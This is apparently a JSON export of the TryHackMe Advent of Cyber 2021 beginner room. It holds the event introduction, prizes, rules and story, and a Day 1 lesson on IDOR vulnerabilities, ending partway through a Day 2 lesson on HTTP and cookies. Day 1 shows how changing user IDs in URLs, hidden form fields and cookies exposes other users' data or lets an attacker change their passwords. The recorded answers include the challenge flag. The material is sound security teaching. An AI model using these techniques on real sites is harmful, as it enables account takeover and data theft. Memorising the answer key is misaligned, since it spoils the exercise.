{"success":true,"data":[{"taskTitle":"Introduction","taskDesc":"<div style=\"color:rgb(136, 204, 20);font-size:24px;font-weight:700;text-align:center\"><span style=\"font-size:30px\">Welcome to Advent of Cyber 2021<br /></span></div><div style=\"text-align:center\"><span style=\"font-size:1rem\"><br />Get started with Cyber Security in 25 days, by learning the basics and completing a new, beginner friendly security exercise every day leading up until Christmas; </span><i><span style=\"font-size:1rem\">an advent calendar but with security challenges and not </span>chocolate<span style=\"font-size:1rem\">.</span></i></div><div style=\"text-align:center\"><i><span style=\"font-size:1rem\"><br /></span></i></div><div style=\"text-align:center\"><span style=\"color:rgb(136, 204, 20);font-size:24px\"><b>Prizes &amp; Certificate</b></span></div><div style=\"text-align:center\">We have over $19,000 worth of prizes! In this event, points don't matter but the number of questions you answer does. For each task you get correct, you get a raffle ticket and on the 26th December, we will choose the winners randomly using everyone's raffle tickets; the more questions you answer, the more chance you have of winning. Here are the prizes up for grabs:</div><div style=\"textSe-align:center\"><br /></div><div style=\"text-align:center\"><table class=\"table no-border m-auto\" style=\"width:1076px;text-align:left\"><tbody><tr><td><p><a href=\"https://www.offensive-security.com/pwk-oscp\" target=\"_blank\">5x PWK Course + 30 day lab access + OSCP exam certification ($4,995)</a><br /><a href=\"https://uk.store.asus.com/14524-ux425ja-bm031t-feed.html\" target=\"_blank\">4x ASUS ZenBook 14 8GB RAM, 512GB SSD, Intel i5 ($4000)</a><br /><a target=\"_blank\" href=\"https://portswigger.net/web-security/certification\">35x Burp Suite Certified Practitioner Exam Vouchers ($3225)</a><br /><a href=\"https://www.offensive-security.com/labs/individual/\" target=\"_blank\">20x Proving Grounds Vouchers ($380)</a><br /><a href=\"https://tryhackme.com/network/throwback\" target=\"_blank\">5x Attacking Windows AD Throwback Course ($425)</a><br /><a href=\"https://www.raspberrypi.org/products/raspberry-pi-400\" target=\"_blank\">2x Raspberry Pi 400 ($244)</a><br /><a href=\"https://shop.hak5.org/products/o-mg-cable\" target=\"_blank\">2x HAK5 O.MG Cable ($240)</a><br /></p></td><td>\n<a target=\"_blank\" href=\"https://www.bc-security.org//courses/advanced-threat-emulation-for-red-teams\">2x Advanced Threat Emulation: Red Teams BCSecurity ($3798)</a><br /><a target=\"_blank\" href=\"https://uk-store.comptia.org/comptia-security-plus-exam-voucher/p/SEC-601-TSTV-20-C\">4x CompTIA Security+ Exam Vouchers ($1164)</a><br /><a target=\"_blank\" href=\"http://store.tryhackme.com/\">5x $30 TryHackMe Swag Vouchers ($150)</a><br /><a target=\"_blank\" href=\"https://shop.hak5.org/products/wifi-pineapple\">2x HAK5 Wifi Pineapple ($200)</a><br /><a target=\"_blank\" href=\"https://shop.hak5.org/collections/sale/products/usb-rubber-ducky-deluxe\">2x HAK5 Rubber Ducky ($100)</a><br /><a href=\"https://tryhackme.com/why-subscribe\" target=\"_blank\">15x TryHackMe Subscriptions ($150)</a><br /><br /></td></tr></tbody></table></div><div style=\"text-align:center\"><i>Total Prize Pool Value: <b>$19,121</b></i><br /><br />Also, everyday you complete a challenge, you get entered into another prize draw for the chance to win a mini-prize. The \"daily prizes\" are done at the end of the week. <span style=\"font-size:1rem\">Complete every task in the event and earn a certificate of completion! Make sure your name is set in your </span><a class=\"nocss\" href=\"/profile\">settings</a><span style=\"font-size:1rem\">.<br /></span></div><div style=\"text-align:center\"><span style=\"font-size:1rem\"><br /></span></div><div style=\"text-align:center\"><details><summary>View Sample Certificate</summary><img class=\"mb-3\" src=\"/img/events/christmas/adventofcyber3cert.png\" /></details></div><br /><div style=\"text-align:center\"></div><div style=\"text-align:center\"><span style=\"color:rgb(136, 204, 20);font-size:24px;font-weight:700\">Our Sponsors<br /></span><div>In the spirit of Christmas, we've brought together some of the biggest names in cyber security and are ecstatic that they're supporting the event by sponsoring prizes!</div></div><table class=\"table no-border m-auto\" style=\"width:1076px\"><tbody><tr><td style=\"width:25%\"><p><img src=\"https://tryhackme.com/img/comptia.png\" style=\"width:100%\" /><br /><span style=\"text-align:left;font-size:1rem\">CompTIA is the global, non-profit IT trade association and creator of vendor neutral IT certifications. CompTIA certifications are developed with the support of leading technology companies and validated by industry experts around the world.</span><br /></p></td><td style=\"width:25%\"><p><img src=\"https://tryhackme.com/img/companies/offsec.png\" style=\"width:100%\" /><br /><span style=\"font-size:1rem\">Offensive Security offers industry-defining information security training. In addition to courses and certifications, students can get hands-on pentesting practice in our Proving Grounds labs. Level up your skills and learn the Try Harder mindset with the team behind the OSCP certification.</span></p></td><td style=\"width:25%\"><p><br /></p><p><img src=\"https://assets.tryhackme.com/img/companies/portswigger-dark.png\" style=\"width:100%\" /><br /></p><p>PortSwigger are the creators of Burp Suite, the world's leading web application security testing toolkit. Their center of excellence is the PortSwigger Research team, where they discover and exploit vulnerabilities, then feed their findings back into Burp Suite products.</p></td><td style=\"width:25%\"><p><img src=\"https://tryhackme.com/img/companies/bcsecurity.png\" alt=\"BC Security\" style=\"width:100%\" /><br />BC Security provide cybersecurity assessments across a broad range of disciplines, and bring not only technical expertise but a strong understanding of compliance regulations and risk mitigation that are essential to conducting business in today’s world.<br /></p></td></tr></tbody></table><table class=\"table no-border m-auto\"><tbody></tbody></table><div style=\"text-align:center\"><br /><span style=\"color:rgb(136, 204, 20);font-size:24px;font-weight:700\">Videos Featuring</span><span style=\"font-size:24px\"><b><br /></b></span><span style=\"color:rgb(33, 37, 41);font-size:1rem;font-weight:400\">Each task released has a supporting video walkthrough, from a range of amazing and highly talented creators, including:</span></div><p style=\"text-align:center\">CyberSecMeg, John Hammond, Tib3rius, Neal Bridges, HuskyHacks, InsiderPhD, and NahamSec!</p><p style=\"text-align:center\"><br /></p><p style=\"text-align:center\"><span style=\"color:rgb(136, 204, 20);font-size:24px;font-weight:700\">Topics Include<br /></span>Topics that will be covered in the event are</p>\n<div class=\"text-center\"><span class=\"badge badge-soft-danger size-18\">Web Exploitation</span> <span class=\"badge badge-soft-warning size-18\">Network Exploitation</span> <span class=\"badge badge-soft-success size-18\">OSINT</span> <span class=\"badge badge-soft-purple size-18\">Cloud Hacking</span> <span class=\"badge badge-soft-primary size-18\">Defensive Blue Teaming</span></div>","taskType":"none","taskNo":1,"taskCreated":"2020-11-10T22:10:28.104Z","taskDeadline":null,"tasksInfo":[{"question":"Read the above and checkout the sponsors","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"Read the above and checkout the sponsors","hint":""}]},{"taskTitle":"Our Socials","taskDesc":"<table class=\"table no-border mb-0\" style=\"text-align:center\"><tbody><tr><td style=\"width:25%\"><p><a target=\"_blank\" href=\"https://www.linkedin.com/company/tryhackme/\"><img src=\"https://i.imgur.com/NE1MTfp.png\" style=\"width:25%\" /></a><a target=\"_blank\" href=\"https://www.linkedin.com/company/tryhackme\"></a><br /><br />Follow us on <a href=\"https://www.linkedin.com/company/tryhackme/\" target=\"_blank\">LinkedIn</a><br /><br /></p></td><td style=\"width:25%\"><p><a target=\"_blank\" href=\"https://discord.gg/tryhackme\"><img src=\"https://i.imgur.com/6FqJLYj.png\" style=\"width:25%\" /></a><br /><span style=\"font-size:1rem\"><br />Be a part of our community and join our </span><a href=\"https://discord.gg/tryhackme\" target=\"_blank\">discord</a></p></td><td style=\"width:25%\"><p style=\"margin-bottom:1rem\"><a target=\"_blank\" href=\"https://twitter.com/RealTryHackMe\"><img src=\"https://i.imgur.com/y5gfPvo.png\" style=\"width:25%\" /></a><br /><span style=\"font-size:1rem\"><br />Follow us on </span><a href=\"https://twitter.com/RealTryHackMe\" target=\"_blank\">Twitter</a><span style=\"font-size:1rem\"> to receive daily challenge posts</span><br /></p></td><td style=\"width:25%\"><p><a href=\"https://www.reddit.com/r/tryhackme/\"><img src=\"https://i.imgur.com/SgiJIgo.png\" style=\"width:25%\" /></a><br /><br />Join our growing  <a href=\"https://www.reddit.com/r/tryhackme/\" target=\"_blank\">subreddit</a><br /><br /></p></td></tr></tbody></table><div style=\"font-size:1rem;text-align:center\">We will choose a random winner every day, to enter simply complete the challenge released on that day. All winners will be announced via Twitter on the weekend! <span style=\"font-size:1rem\">Want to share the event, feel free to use the graphic below!</span></div><div style=\"font-size:1rem;text-align:center\"><span style=\"font-size:1rem\"><br /></span></div><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/eb9232ec05abd89baae59649fd314b83.png\" style=\"width:753px;height:423.561px\" /><br /></p><p style=\"text-align:center\"><a href=\"https://tryhackme.com/christmas\" target=\"_blank\"><span style=\"font-size:24px\">https://tryhackme.com/christmas</span></a><br /></p>","taskType":"none","taskNo":2,"taskCreated":"2020-11-12T02:43:14.439Z","taskDeadline":null,"tasksInfo":[{"question":"<p>Follow us on <a href=\"https://www.linkedin.com/company/tryhackme/\" target=\"_blank\">LinkedIn</a>!</p>","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"Join our <a href=\"https://discord.gg/tryhackme\" target=\"_blank\">Discord</a> and say hi!","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Follow us on <a href=\"https://twitter.com/RealTryHackMe\" target=\"_blank\">Twitter</a>!</p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Check out the <a href=\"https://www.reddit.com/r/tryhackme/\" target=\"_blank\">subreddit</a>!</p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"<p>Follow us on <a href=\"https://www.linkedin.com/company/tryhackme/\" target=\"_blank\">LinkedIn</a>!</p>","hint":""},{"questionNo":2,"question":"Join our <a href=\"https://discord.gg/tryhackme\" target=\"_blank\">Discord</a> and say hi!","hint":""},{"questionNo":3,"question":"<p>Follow us on <a href=\"https://twitter.com/RealTryHackMe\" target=\"_blank\">Twitter</a>!</p>","hint":""},{"questionNo":4,"question":"<p>Check out the <a href=\"https://www.reddit.com/r/tryhackme/\" target=\"_blank\">subreddit</a>!</p>","hint":""}]},{"taskTitle":"Subscribing, TryHackMe for Business &amp; Christmas Swag!","taskDesc":"<div style=\"font-weight:bolder;color:rgb(136, 204, 20);font-size:24px;text-align:center\">Subscribing</div><p style=\"text-align:center\">The Advent of Cyber event is completely free! However, check out some of the reasons to subscribe: </p><p style=\"text-align:center\"></p>\n<p style=\"text-align:center\"><a target=\"_blank\" href=\"https://tryhackme.com/why-subscribe\"><img src=\"https://tryhackme.com/img/general/why-subscribe.png\" /></a></p><p style=\"text-align:center\">If you want to gift a TryHackMe VIP subscription, you can <a href=\"https://tryhackme.com/subscriptions\" target=\"_blank\">purchase vouchers</a>.</p><p style=\"text-align:center\">In celebration of Advent of Cyber, you can get <b><span style=\"color:#89cc13\">20% off</span></b> the annual subscription using the discount code <code style=\"font-size:18px\">AOC2021</code> at checkout. This discount is only valid until the 7th of December, that's in: </p><p style=\"text-align:center\">\n</p><div class=\"text-center m-auto\"><img src=\"https://gen.sendtric.com/countdown/wx988xkug5\" style=\"text-align:center;display:block;margin:auto;width:329.5px;height:65.9px\" /></div><div class=\"text-center m-auto\"><br /></div>\n<p></p><div><br /></div><div style=\"font-weight:bolder;color:rgb(136, 204, 20);font-size:24px;text-align:center\">Completing Advent of Cyber as an organization</div><p style=\"text-align:center\"><b></b></p><p style=\"text-align:center\"><span style=\"font-size:1rem\">Advent of Cyber is a perfect event for introducing and upskilling many different teams within your company in cyber, through this fun 25-day event! </span></p><p style=\"text-align:center\"><span style=\"font-size:1rem;text-align:left\">With TryHackMe's <a href=\"https://tryhackme.com/business\" target=\"_blank\">management dashboard for business</a>, teams in your company can tackle the daily challenges together, where you can monitor their progress and give them a premium learning experience.</span></p><p style=\"text-align:center\"><span style=\"font-size:1rem;text-align:left\"><br /></span></p><p style=\"text-align:center\"><span style=\"color:rgb(136, 204, 20);font-size:24px;font-weight:700\">Christmas Swag</span></p><p style=\"text-align:center\">Want to rep swag from your favorite cyber security training platform?<br />We have a special edition Christmas Advent of Cyber <a href=\"https://store.tryhackme.com/collections/all/products/limited-edition-advent-of-cyber-t-shirt?variant=39643051065411\" target=\"_blank\">t-shirt</a>. Buy from our <a href=\"https://store.tryhackme.com/\" target=\"_blank\">swag store</a>.<br /><br /><a href=\"https://store.tryhackme.com/collections/all/products/limited-edition-advent-of-cyber-t-shirt?variant=39643051065411\"><img src=\"https://cdn.shopify.com/s/files/1/0275/0716/3203/products/unisex-staple-t-shirt-black-heather-front-6193b2fa6d210_1024x1024@2x.jpg?v=1637069569\" style=\"width:356.375px;height:356.375px\" /></a></p>","taskType":"none","taskNo":3,"taskCreated":"2020-11-17T17:01:10.356Z","taskDeadline":null,"tasksInfo":[{"question":"Read the above.","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"Read the above.","hint":""}]},{"taskTitle":"Short Tutorial &amp; Rules","taskDesc":"<div style=\"font-weight:bolder;color:rgb(136, 204, 20);font-size:24px;text-align:center\">Short Tutorial</div><p><br />To access target machines you deploy on TryHackMe will need to either, use an OpenVPN client, or deploy your own web-based AttackBox (<i>you can do this by clicking the blue \"Start AttackBox\" button at the top of this page</i>). <span style=\"font-size:1rem\">We highly recommend you complete the </span><a href=\"/room/tutorial\" target=\"_blank\">Tutorial</a><span style=\"font-size:1rem\"> room to learn more about getting connected.</span></p><p style=\"text-align:left\">Using the web-based AttackBox, you can complete all of these exercises through your browser. If you're a regular user, you can deploy the AttackBox for free 1 hour a day, if you're <a href=\"https://tryhackme.com/profile#subscribe\" target=\"_blank\">subscribed</a> you can deploy it for an unlimited amount of time! </p><p style=\"text-align:left\"><br /></p><h3><span class=\"fad fa-gavel text-success\"><div style=\"text-align:center\"></div></span> Rules</h3><p>Breaking any of the following rules will result in elimination from the competition</p><ul><li>*.tryhackme.com and the OpenVPN server is off-limits to probing, scanning, or exploiting.</li><li>Users are only authorized to hack machines that have been deployed in the rooms they have access to.</li><li>Users are not to target or attack other users</li><li>Users should only enter the event once, using one account.</li><li>Answers to questions are not to be shared; unless shown on videos/streams.</li></ul>","taskType":"none","taskNo":4,"taskCreated":"2020-11-12T02:45:04.954Z","taskDeadline":null,"tasksInfo":[{"question":"Practice connecting to our network!","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"Practice connecting to our network!","hint":""}]},{"taskTitle":"The Story","taskDesc":"<p style=\"text-align:center\"><span class=\"colour\" style=\"color:rgb(136, 204, 20)\"><strong><span class=\"size\" style=\"font-size:24px\">[The Christmas Story]</span></strong></span></p><p style=\"text-align:center\"><span class=\"colour\" style=\"color:rgb(136, 204, 20)\"><span style=\"color:rgb(33, 37, 41)\">All exercises in Advent of Cyber follow a fun Christmas story. This year, the elf McSkidy needs your help to hack back and undo the grinch's malicious activities.</span><strong><span class=\"size\" style=\"font-size:24px\"><br /></span></strong></span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/5e8cb80480c59ddb6a15d732bf114af7.png\" style=\"width:629px;height:943.756px\" /><br /></p><p>                                                                 <br /></p><p><span style=\"font-size:1rem\">It's the eve of 30th November - McSkidy sits in her large office with a cup of hot cocoa, reminiscing over her stressful times at the Best Festival Company. Since her management of the Christmas Monster's cyber attacks last December, she'd been promoted to Chief Information Security Office (CISO) and has managed to build a world-class security team. She made a promise to never let Christmas get affected by cyber incidents and has done everything in her power to prepare the best festival company for any incidents, and assist Santa in delivering presents globally with no disruptions!</span><br /></p><p>As she grins to herself \"After all we've done, what could go wrong\", Elf McAssistant runs into her office and gasps \"All our security analysts have missed their last shift and no security personnel can be found in the building\". McSkidy jumps out of her chair and spills her hot cocoa all over herself \"WHAT\".</p><p>She swiftly moves over to the Elf Security Center housing the security personnel and looks over the large area filled with empty desks. <em>Where did everyone go on the eve of the most important time for the Best Festival Company.</em> She rushes over to the desk of the head of her security analyst team, Elf McLeader, and notices the desk is surprisingly clean. For someone so messy, how is his work area completely empty? As she started theorising in her head, she noticed a small piece of paper hidden at the back of the desk behind the screen. As she made sense of what was on the paper, her eyes widened - why did McProfessional book a one-way flight ticket away on this exact day!</p><p>Before she had time to make any assumptions, a loud, grumpy voice was resonating across the security center from the internal announcement systems \"Grinch Enterprises will never let Christmas succeed. It would be a shame if your world-class security team just suddenly disappeared\"</p><p>\"<em>THIS WAS ALL PLANNED - HOW DID THEY ACCESS OUR INTERNAL SYSTEMS\"</em> cried McSkidy. Their intelligence team had prepared for this exact scenario but it didn't help that the security center was completely empty!</p><p>\n\n\n\n\n</p><p>\"This needs to stop happening\" sighed McSkidy and dragged herself to the office to save Christmas</p>\n<p><strong>Please note, tasks are released daily and will vary in difficulty</strong> <em>(although will always be aimed at a beginner level)</em></p>\n","taskType":"none","taskNo":5,"taskCreated":"2020-11-10T22:09:58.062Z","taskDeadline":null,"tasksInfo":[{"question":"<p>The Christmas story is used within some of the tasks, so make sure you read the above.</p>\n","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"<p>The Christmas story is used within some of the tasks, so make sure you read the above.</p>\n","hint":""}]},{"taskTitle":"[Day 1] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Save The Gifts","taskDesc":"<div><span style=\"text-align:center;font-size:24px\">Check out John Hammond's video kicking off Advent of Cyber 3 </span><a href=\"https://www.youtube.com/watch?v=858rVeWB8Pw\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><span style=\"font-weight:bolder\"><span style=\"font-size:24px\"><br /></span></span></div><p><span style=\"font-size:24px;font-weight:bolder\"><br />Story</span><br /></p><p>The inventory management systems used to create the gifts have been tampered with to frustrate the elves. It's a night shift, and McStocker comes to McSkidy panicking about the gifts all being built wrong. With no managers around to fix the issue, McSkidy needs to somehow get access and fix the system and keep everything on track to be ready for Christmas!</p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Learning Objectives</span></span></p><ol><li>What is an IDOR vulnerability?</li><li>How do I find and exploit IDOR vulnerabilities?</li><li>Challenge Walkthrough.</li></ol><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">What is an IDOR vulnerability?</span></span></p><p>IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability. An access control vulnerability is when an attacker can gain access to information or actions not intended for them. An IDOR vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), and too much trust has been placed on that input data, and the web application does not validate whether the user should, in fact, have access to the requested object.<br /></p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">How do I find and exploit IDOR vulnerabilities?</span></span></p><p>As previously mentioned, an IDOR vulnerability relies on changing user-supplied data. This user-supplied data can mainly be found in the following three places:<span style=\"font-weight:bolder\"><br /></span></p><p><span style=\"font-weight:bolder\">Query Component:</span></p><p>Query component data is passed in the URL when making a request to a website. Take, for instance, the following screenshot of a URL.</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/96ca5139d906961178a2ef917850f96d.png\" style=\"width:524.733px;height:61.7333px\" /><br /></p><p>We can breakdown this URL into the following:</p><p><span style=\"font-weight:bolder\">Protocol:</span> https://</p><p><span style=\"font-weight:bolder\">Domain:</span> website.thm</p><p><span style=\"font-weight:bolder\">Page:</span> /profile</p><p><span style=\"font-weight:bolder\">Query Component:</span> id=23</p><p>Here we can see the /profile page is being requested, and the parameter <span style=\"font-weight:bolder\">id</span> with the value of 23 is being passed in the query component. This page could potentially be showing us personal user information, and by changing the id parameter to another value, we could view other users data.<br /></p><p><span style=\"font-weight:bolder\">Post Variables:</span></p><p>Examining the contents of forms on a website can sometimes reveal fields that could be vulnerable to IDOR exploitation. Take, for example, the following HTML code for a form that updates a user's password.</p><p><code style=\"font-size:14px\">&lt;form method=\"POST\" action=\"/update-password\"&gt;<br />    <span style=\"background-color:rgb(255, 255, 0);color:rgb(0, 0, 0)\">&lt;input type=\"hidden\" name\"user_id\" value=\"123\"&gt;</span><br />    &lt;div&gt;New Password:&lt;/div&gt;<br />    &lt;div&gt;&lt;input type=\"password\" name=\"new_password\"&gt;&lt;/div&gt;<br />    &lt;div&gt;&lt;input type=\"submit\" value=\"Change Password\"&gt;<br />&lt;/form&gt;</code><br /></p><p>You can see from the highlighted line that the user's id is being passed to the webserver in a hidden field. Changing the value of this field from 123 to another user_id may result in changing the password for another user's account.<br /></p><p><span style=\"font-weight:bolder\">Cookies:</span><br /></p><p>To stay logged into a website such as this one, cookies are used to remember your session. Usually, this will involve sending a session id which is a long string of random hard to guess text such as <span style=\"font-weight:bolder\">5db28452c4161cf88c6f33e57b62a357, </span>which the webserver securely uses to retrieve your user information and validate your session. Sometimes though, less experienced developers may store user information in the cookie its self, such as the user's ID. Changing the value of this cookie could result in displaying another user's information. See below for an example of how this might look.</p><p><code style=\"font-size:14px\">GET /user-information HTTP/1.1<br />Host: website.thm<br /><span style=\"background-color:rgb(255, 255, 0);color:rgb(0, 0, 0)\">Cookie: user_id=9</span><br />User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0<br /><br />Hello Jon!<br /></code><br /></p><p><code style=\"font-size:14px\">GET /user-information HTTP/1.1<br />Host: website.thm<br /><span style=\"background-color:rgb(255, 255, 0);color:rgb(0, 0, 0)\">Cookie: user_id=5</span><br />User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0<br /><br />Hello Martin!<br /></code></p><p><span style=\"font-size:1rem\"><br /></span><span style=\"font-size:24px;font-weight:bolder\">IDOR in the wild</span><span style=\"font-size:24px\"><span style=\"font-weight:bolder\"><br /></span></span><span style=\"font-size:1rem\">Seeing a product, user, or service identifier in the URL or otherwise is a must to test. IDOR vulnerabilities can reveal sensitive information, as well as potentially giving you access to usually restricted site functionality. For security researchers, IDOR vulnerabilities can be impactful, and reporting them can yield a good bug bounty; see this <a href=\"https://corneacristian.medium.com/top-25-idor-bug-bounty-reports-ba8cd59ad331\" target=\"_blank\">article</a>, where an IDOR vulnerability report to PayPal had a $10,500 payout.</span></p><p><span style=\"font-size:1rem\"><br /></span></p><p><span style=\"font-weight:bolder\"><span style=\"font-size:24px\">Challenge Walkthrough</span></span></p><p>Click the green \"View Site\" button at the top right of this task to open up the inventory management system.</p><p>Here you'll find a mock browser on the <span style=\"font-weight:bolder\">completed orders</span> page showing images of the toys which have been made incorrectly due to the Grinch's tampering!</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/ef89337b7cf4e7db962f93a4cefad04e.png\" /><br /></p><p align=\"left\">There are also three other pages on the navigation panel; Builds, Inventory and Your Activity.</p><ol><li>The <span style=\"font-weight:bolder\">builds</span> page shows different toys and the parts they are made up of (as you can see, due to tampering, these are all incorrect)</li><li>The <span style=\"font-weight:bolder\">Inventory</span> page lists the individual items with their corresponding SKU codes.</li><li>The <span style=\"font-weight:bolder\">Your Activity</span> page displays McSkidy's user information, photo and their recent actions on the system.</li></ol><p align=\"left\">As we learnt above, an IDOR vulnerability requires changing some kind of user input. Out of all the pages we can navigate to, the only page that has input that can be altered is on the <span style=\"font-weight:bolder\">Your Activity</span> page. You'll see in the URL a query component parameter named <span style=\"font-weight:bolder\">user_id,</span> which is set to the value of <span style=\"font-weight:bolder\">11</span> (McSkidy's User Id).</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e8209307268195f6830ae9237551c832.png\" style=\"width:771.185px;height:40.7333px\" /><br /></p><p>Try changing the <span style=\"font-weight:bolder\">user_id</span> value in the address bar, and you'll see that the web application tries to load another user's information. Try different numbers between the values 1 - 20 until you find a user who could have been responsible for the tampering on the system.</p><p align=\"center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/d7cf67201a5b8beefbf6ef86a68d0651.png\" /><br /></p><p align=\"left\">Clicking on the <span style=\"font-weight:bolder\">Revert</span> button on the user's actions will roll back the changes and allow the toy-making machine to make properly built toys again. Once all the changes have been reverted, you'll be rewarded with a flag which can be entered below.</p>","taskType":"static-site","taskNo":6,"taskCreated":"2020-11-12T02:45:54.983Z","taskDeadline":null,"tasksInfo":[{"question":"<p>After finding Santa's account, what is their position in the company?<br /></p>\n","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":2,"submission":"The Boss!","noAnswer":false,"answerDesc":"Answer format: *** *****"},{"question":"<p>After finding McStocker's account, what is their position in the company?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"Build Manager","noAnswer":false,"answerDesc":"Answer format: ***** *******"},{"question":"<p>After finding the account responsible for tampering, what is their position in the company?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"Mischief Manager","noAnswer":false,"answerDesc":"Answer format: ******** *******"},{"question":"<p>What is the received flag when McSkidy fixes the Inventory Management System?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{AOC_IDOR_2B34BHI3}","noAnswer":false,"answerDesc":"Answer format: ***{*****************}"},{"question":"<p>If you want to learn more about IDOR vulnerabilities, we suggest trying out this room <a href=\"https://tryhackme.com/room/idor\" target=\"_blank\">https://tryhackme.com/room/idor</a><br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Tasks released each day get progressively harder (but are still guided with walkthrough videos). Come back tomorrow for Day 2's task!<br /></p>","hint":"","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"618a5df7437056aee26b3bc5","questions":[{"questionNo":1,"question":"<p>After finding Santa's account, what is their position in the company?<br /></p>\n","hint":""},{"questionNo":2,"question":"<p>After finding McStocker's account, what is their position in the company?<br /></p>","hint":""},{"questionNo":3,"question":"<p>After finding the account responsible for tampering, what is their position in the company?<br /></p>","hint":""},{"questionNo":4,"question":"<p>What is the received flag when McSkidy fixes the Inventory Management System?<br /></p>","hint":""},{"questionNo":5,"question":"<p>If you want to learn more about IDOR vulnerabilities, we suggest trying out this room <a href=\"https://tryhackme.com/room/idor\" target=\"_blank\">https://tryhackme.com/room/idor</a><br /></p>","hint":""},{"questionNo":6,"question":"<p>Tasks released each day get progressively harder (but are still guided with walkthrough videos). Come back tomorrow for Day 2's task!<br /></p>","hint":""}],"staticSites":[{"autoOpen":false,"title":"AoC IDOR","url":"https://static-labs.tryhackme.cloud/sites/aoc-idor/"}]},{"taskTitle":"[Day 2] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Elf HR Problems","taskDesc":"<p><span style=\"text-align:center;font-size:24px\">Check out John Hammond's walkthrough video for day 2 </span><a href=\"https://www.youtube.com/watch?v=8XYtpv-3-No\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><span style=\"font-size:24px\"><br /></span></p><p><span style=\"font-size:24px\">Story</span></p><p>McSkidy needs to check if any other employee elves have left/been affected by Grinch Industries attack, but the systems that hold the employee information have been hacked. Can you hack them back to determine if the other teams in the Best Festival Company have been affected?</p>\n\n<div>\n<p><span style=\"font-size:24px\">Learning Objectives</span></p>\n\n<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/51333ad8cdaade3fcd23986dbd235b5c.png\" style=\"float:right;width:141.24px;height:141.24px\" class=\"note-float-right\" />\n<ul><li>Understanding the underlying technology of web servers and how the web communicates.</li><li>Understand what cookies are and their purpose.</li>\n<li>Learn how to manipulate and manage cookies for malicious use.</li></ul>\n</div>\n\n<p><span style=\"font-size:24px\">HTTP(S)</span></p><p>For your computer and a webserver to communicate with each other, an intermediary protocol is required. This is where the HTTP (Hypertext Transfer Protocol) is introduced! The HTTP protocol is a client-server protocol to provide communication between a client and a webserver. HTTP requests are similar to a standard TCP network request; however, HTTP adds specific headers to the request to identify the protocol and other information.<br /></p><p style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">When an HTTP request is crafted, the </span><em>method</em><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> and </span><em>target</em><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> header will always be included. The target header will specify what to retrieve from the server, and the method header will specify how.</span></p><p style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">When retrieving information from a web server, it is common to use the </span><em>GET</em><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"> method, such as loading a picture.</span></p><p style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><br /></span></p><p><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">When sending data to a web server, it is common to use the </span><em>POST</em><span style=\"color:rgb(14, 16, 